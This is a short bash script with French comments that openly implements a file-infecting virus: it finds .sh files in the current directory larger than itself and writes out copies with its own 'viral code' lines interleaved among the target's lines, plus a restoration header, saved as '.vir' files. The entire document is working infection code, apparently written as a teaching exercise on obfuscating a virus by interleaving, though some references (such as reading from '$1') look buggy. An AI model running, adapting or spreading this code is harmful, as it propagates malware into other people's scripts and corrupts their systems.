#!/bin/bash
## R =  nombre de lignes du code de restauration  et code viral
R=23
LV=$(wc -l $0 | cut -d " " -f1)
for file in *.sh
do
    L=$(wc -l $file | cut -d " " -f1)
    if [ $file != $(basename $0)   -a  $(($LV)) -lt $(($L)) ] # -a  $file != $(basename $1)  -a  $file != $(basename "restauration-cible.sh") ]
    then	
	# les fichiers d'entree et de sortie
	cible=$file
	codeviral=$0
	resultat="temp.sh"
	cp /dev/null $resultat	
	echo "$cible, $codeviral, $resultat"
	# ajout du code de restauration
	head -n $R $1 >> $resultat
	# calcul de s
	L=$(wc -l $cible | cut -d " " -f1)
	LV=$(wc -l $codeviral | cut -d " " -f1)
	s=$((L / LV ))
	echo "ligne cible=$L, ligne virale=$LV, s=$s"
	# boucle ou on entrelace cible et code viral
	j=1
	while [ $j -le $LV ]
	do
	    head -n $(($j*$s))  $cible | tail -n $s >> $resultat
	    head -n $j  $codeviral | tail -n 1 >> $resultat    
	    j=$(($j+1))
	done
	tail -n $(($L-$LV*$s)) $cible >> $resultat
	mv $resultat "$file.vir"
	#
	#
    fi
    #
done
#
